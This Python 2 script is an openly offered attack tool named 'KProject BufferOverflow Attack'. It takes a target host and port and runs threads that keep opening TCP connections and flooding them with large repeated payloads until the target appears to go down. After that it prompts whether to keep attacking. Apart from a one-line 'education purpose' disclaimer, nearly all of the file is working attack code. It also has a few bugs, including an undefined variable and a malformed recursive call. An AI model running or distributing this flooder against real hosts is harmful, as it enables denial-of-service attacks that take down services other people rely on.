#!/usr/bin/python 
#
#   File:	kpbuffattack.py
#   Author: Nick Lauri
#
#   Coyright (c) 2016 by Nick Lauri.
#


import os, sys
import socket, threading
from libs import kpstd

class prog:
	name = os.path.split(sys.argv[0])[1]
	version = '1.0'
	hversion = 0x0100	# 1.00

class target:
	name 		  = None    # inital target name
	port          = 80		# inital target port
	limit_down    = 100	    # number of errors connection to regard target is down
	is_alive      = False	# target status
	threads       = 5
	verbose	      = True
	
class packet:
	sent    = 0	    # in bytes
	count   = 0	    # number of packets
	data    = ''    # string of data (default: 'A')
	ndata   = 0	    # number of clonning data
	datalen = 0

class error:
	socket  = 0
	connect = 0
	send    = 0 
	thread  = 0
	current = False
	current_count = 0

usage_string = """\
Usage: python %s <options>
Options:
    -d,--data S     : Using string S for data.
    -f,--file F     : Load data from file F.
    -h,--host H     : Set target host.
       --help       : Print this help and exit.
    -l,--limit  N   : Set limit error to regard target is down (default: 100).
    -n,--num    N   : Cloning data (make data bigger, default: datalen >= 1000)
    -p,--port   N   : Set port (default: 80).
    -q              : Be quiet.
    -t,--threads N  : Run with N threads (default: 5).
       --target H   : Alias of `--host` option.
       --version    : Print version and exit.
Note:
    - Just option `file` or `data`.
    - If no data, using letter 'A'*1000.
    - If more options in the same type found, I get the last.
    - More thread, more speed and maybe slow down your internet speed and
        more hot.
    - This tool is for education purpose, usage of this tool is the end user's 
        responsibility.
"""
#	must enter every args, bcoz to make this function flexible.
def attack(host, port, data, ndata):
	"""
	attack(host, port, data, cclone)
	
	- host  : target host
	- port  : target port
	- data  : data to send
	- ndata : clonning number of <data> to send
	"""
	
	if not target.is_alive:
		return
	
	try:
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
	except Exception as e:
		error.socket += 1
		return
	
	try:
		client.connect((host, port))
	except Exception:
		error.connect += 1
		if error.current:
			error.current_count += 1
		else:
			error.current = True
		
		if error.current_count == target.limit_down:
			target.is_alive = False
		return
	
	try:
		client.send(packet.data * packet.ndata)
		client.close()
		packet.sent += 1
	except Exception:
		error.send += 1
		
#
def thread_manager(func, num, target_tuple_args, verbose=True):
	"""
	thread_manager(target, num, *arg, **kwarg)
	
	- target: target function
	- num   : inital number of threads
	- arg   : (tuple) args of function
	- kwarg : (dict) args of function
	"""
	
	def bytesformat(num):
		B  = [1, 'B']
		KB = [1024* B[0], 'KB']
		MB = [1024*KB[0], 'MB']
		GB = [1024*MB[0], 'GB']
		
		if float(num)/GB[0] > 1:
			return "%.2f GB" %(round(float(num)/GB[0], 2))
		elif float(num)/MB[0] > 1:
			return "%.2f MB" %(round(float(num)/MB[0], 2))
		elif float(num)/KB[0] > 1:
			return "%.2f KB" %(round(float(num)/KB[0], 2))
		else:
			return "%4d B" %(num)
	
	try:
		while True:
			if len(threading.enumerate()) - 1 < num:
				try:
					th = threading.Thread(target=func, args=(target_tuple_args[0], target_tuple_args[1], \
						target_tuple_args[2], target_tuple_args[3]))
					th.start()
				except Exception as e:
					#print ' '*80 + '\r'
					kpstd.error("Can not start thread.\n")
					print e
					error.thread += 1
		
			if verbose:
				#print ' '*80 + '\r'
				kpstd.info("Thread active: %2d/%2d | sent: %d packets (%s) | error: %d:%d:%d:%d        \r" \
					%(len(threading.enumerate()) -1, num, packet.sent, bytesformat(packet.datalen*packet.sent),\
					 error.send, error.thread, error.socket, error.connect))

			if not target.is_alive:
				#print ' '*80 + '\r'
				kpstd.info("\nTarget seems to be down. Stop attacking? (Y/n): ")
				choice = raw_input()
				if choice.lower() == 'n':
					target.limit_down += 100
					error.current_count = 0
				else:
					raise Exception
					
			
	except KeyboardInterrupt:
		print
		kpstd.info('Quit? (Y/n): ')
		choice = raw_input()
		if choice.lower() == 'n':
			thread_manager(target, num, verbose, arg, kwarg)
		else:
			kpstd.info('Waiting for all threads stop: ')
			main_thread = threading.current_thread()
			for thread in threading.enumerate():
				if thread != main_thread:
					thread.join()
			print 'OK'
			return
	except Exception:
		print 
		kpstd.info('Waiting for all threads stop: ')
		main_thread = threading.current_thread()
		for thread in threading.enumerate():
			if thread != main_thread:
				thread.join()
		print 'OK'
		return
#

def usage():
	print("%s - KProject BufferOverflow Attack version %s" %(prog.name, prog.version))
	print("Copyright (c) 2016 by Nick Lauri")
	print usage_string %(prog.name)
#

def main():
	if len(sys.argv) == 1:
		usage()
		exit()
	
	def check(arg, laccept):
		for i in laccept:
			if arg == i:
				return True
		else:
			return False
	
	for arg in sys.argv:
		if check(arg, ('--help',)):
			usage()
			exit()
		elif check(arg, ('--version',)):
			print(''.join([prog.name, prog.version]))
			exit()
		elif check(arg, ('-h', '--host')):
			if sys.argv.index(arg) + 1 >= len(sys.argv):
				if not target.name:
					kpstd.error("No host found.\n")
					print
					usage()
					exit()
			else:
				target.name = sys.argv[sys.argv.index(arg) + 1]
		elif check(arg, ('-p', '--port')):
			if sys.argv.index(arg) + 1 >= len(sys.argv):
				kpstd.warn("No argument for option `port` found. Using port: 80\n")
			else:
				port = sys.argv[sys.argv.index(arg) + 1]
				if port.startswith('-'):
					kpstd.warn("No argument for option `port` found. Using port: 80\n")
				elif not port.isdigit():
					kpstd.warn("Value for option `port` is invalid (%s). Using 80 as default.\n" %port)
				else:
					try:
						target.port = int(port)
					except ValueError as e:
						kpstd.error("Can not convert integer port from string(%s). Using port:80\n" %port)
						target.port = 80
					else:
						if target.port > 65535:
							kpstd.error("Value for port must be less than 65535. Using port:80\n")
							target.port = 80
		elif check(arg, ('-t', '--threads')):
			if sys.argv.index(arg) + 1 >= len(sys.argv):
				kpstd.warn("No argument for option `threads` found. Using default: 5\n")
			else:
				threads = sys.argv[sys.argv.index(arg) + 1]
				if threads.startswith('-'):
					kpstd.warn("No argument for option `threads` found. Using default: 5\n")
				elif not threads.isdigit():
					kpstd.warn("Value for option `threads` is invalid (%s). Using 5 as default.\n" %threads)
				else:
					try:
						target.threads = int(threads)
					except ValueError as e:
						kpstd.error("Can not convert integer threads from string(%s). Using default 5\n" %threads)
						target.threads = 5
					else:
						if target.threads > 100:
							kpstd.warn("Really? %d threads? It maybe take your computer down first instead of target.\n"\
							  %(target.threads))
							kpstd.info("Re-input value for option `threads` (blank to apply current value): ")
							newval = raw_input().strip(' ')
							
							if not newval:
								kpstd.info("Apply attacking target with %d threads.\n" %target.threads)
							elif not newval.isdigit():
								kpstd.error("Invalid value for thread! Using 5 threads as default.\n")
								target.threads = 5
							else:
								target.threads = int(newval)
								kpstd.info("Apply new data: %d threads\n" %target.threads)
		elif check(arg, ('-l', '--limit')):
			if sys.argv.index(arg) + 1 >= len(sys.argv):
				kpstd.warn("No argument for option `limit` found. Using limit: 100\n")
			else:
				limit = sys.argv[sys.argv.index(arg) + 1]
				if limit.startswith('-'):
					kpstd.warn("No argument for option `limit` found. Using 100.\n")
				elif not limit.isdigit():
					kpstd.warn("Value for option `limit` is invalid (%s). Using 100 as default.\n" %limit)
				else:
					try:
						target.limit_down = int(limit)
					except ValueError as e:
						kpstd.error("Can not convert integer limit from string(%s). Using 100.\n" %limit)
						target.limit_down = 100
		elif check(arg, ('-q',)):
			target.verbose = False
		elif check(arg, ('-f', '--file')): 
			if sys.argv.index(arg) + 1 >= len(sys.argv):
				kpstd.warn("No argument for option `file` found.\n")
				raise Exception("Argument is missing.")
			elif not os.path.isfile(sys.argv[sys.argv.index(arg) + 1]):
				kpstd.error("Can't open file `%s`. Please, recheck arguments.\n" %(sys.argv[sys.argv.index(arg) + 1]))
				raise Exception("Open file error.")
			else:
				packet.data = [sys.argv[sys.argv.index(arg) + 1]]
		elif check(arg, ('-d', '--data')):
			if sys.argv.index(arg) + 1 >= len(sys.argv):
				kpstd.warn("No argument for option `data` found.\n")
			else:
				packet.data = sys.argv[sys.argv.index(arg) + 1]
				packet.datalen = len(packet.data)
		elif check(arg, ('-n', '--num')):
			if sys.argv.index(arg) + 1 >= len(sys.argv):
				kpstd.warn("No argument for option `num` found.\n")
				continue
			
			num = sys.argv[sys.argv.index(arg) + 1]
			if not num.isdigit():
				kpstd.error("Invalid value for option `num`: %s\n" %num)
				raise Exception("Parse int value error.")
			else:
				packet.ndata = int(num)
				del num
	
	print("%s - KProject BufferOverflow Attack version %s" %(prog.name, prog.version))
	print("Copyright (c) 2016 by Nick Lauri")
	
	if not target.name:
		kpstd.error("No target is specified.\n")
		return
	else:
		kpstd.info("Testing target is alive: ")
		
		try:
			socket.socket().connect((target.name, target.port))
		except Exception as e:
			print("failed")
			kpstd.error("Target seems to be down or something goes wrong.\n")
			target.is_alive = False
			raise Exception(e)
		else:
			print("target is alive!")
			target.is_alive = True
	
	if type(packet.data) == list:
		kpstd.info("Loading data: ")
		try:
			packet.data = open(packet.data[0]).read()
			packet.datalen = len(packet.data)
		except Exception as e:
			print("failed")
			
			if type(e) == tuple:
				e = e[len(e) - 1]
			raise Exception(str(e))
		else:
			print("OK")
	
	if not packet.data:
		packet.data = 'A'
		packet.datalen = 1
		
		if not packet.ndata:
			packet.ndata = 1000
	else:
		packet.datalen = len(packet.data)
	
	if not packet.ndata:
		_count = 1
		while count*packet.datalen <= 1000:
			_count += 1
		packet.ndata = _count
		del _count
	
	packet.datalen = len(packet.data)
	
	kpstd.info("Attack infomation: \n")
	print("   - target : %s" %target.name)
	print("   - port   : %d" %target.port)
	print("   - threads: %d" %target.threads)
	print("   - datalen: %d" %packet.datalen)
	print("   - clone  : %d" %packet.ndata)
	
	kpstd.info("Attack is starting.\n")
	kpstd.info("Press Ctr+C to stop attacking.\n")
	
	thread_manager(attack, target.threads, (target.name, target.port, packet.data, packet.ndata), target.verbose)
	
#
if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		kpstd.error("User quit.\n")
		kpstd.info("Exiting.\n")
	except Exception as e:
		print("Error: " + str(e))
		kpstd.info("Exiting.\n")
	else:
		kpstd.info("Exiting.\n")
	
	
